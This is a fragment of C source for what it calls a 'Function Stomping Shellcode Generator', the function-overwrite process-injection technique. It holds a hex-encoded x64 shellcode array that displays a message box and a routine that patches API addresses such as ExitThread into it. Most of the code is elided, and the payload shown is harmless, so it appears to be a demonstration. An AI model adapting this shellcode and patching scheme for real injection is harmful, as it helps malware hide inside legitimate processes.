...
// Displays "Hello from Function Stomping!" message box
unsigned char messagebox_shellcode[] = {
    0x48, 0x83, 0xEC, 0x28,                         // sub rsp, 0x28
    0x48, 0x31, 0xC9,                               // xor rcx, rcx
    0x48, 0x8D, 0x15, 0x1A, 0x00, 0x00, 0x00,       // lea rdx, [rip+0x1A]
    0x4C, 0x8D, 0x05, 0x23, 0x00, 0x00, 0x00,       // lea r8, [rip+0x23]
    0x48, 0x31, 0xC9,                               // xor rcx, rcx
    ...
    0x6F, 0x6D, 0x20, 0x46, 0x75, 0x6E, 0x63, 0x74,
    0x69, 0x6F, 0x6E, 0x20, 0x53, 0x74, 0x6F, 0x6D,
    0x70, 0x69, 0x6E, 0x67, 0x21, 0x00,             // "Hello from Function Stomping!"
    0x46, 0x75, 0x6E, 0x63, 0x74, 0x69, 0x6F, 0x6E,
    0x20, 0x53, 0x74, 0x6F, 0x6D, 0x70, 0x69, 0x6E,
    0x67, 0x00                                      // "Function Stomping"
};
...
void PatchShellcodeAddresses(unsigned char* shellcode, size_t size, const char* type) {
    ...
    if (strcmp(type, "messagebox") == 0) {
        ...
        // Patch ExitThread address at offset 0x27
        ...
        // Patch ExitThread address at offset 0x21
...
int main(int argc, char* argv[]) {
    printf("[+] Function Stomping Shellcode Generator\n\n");
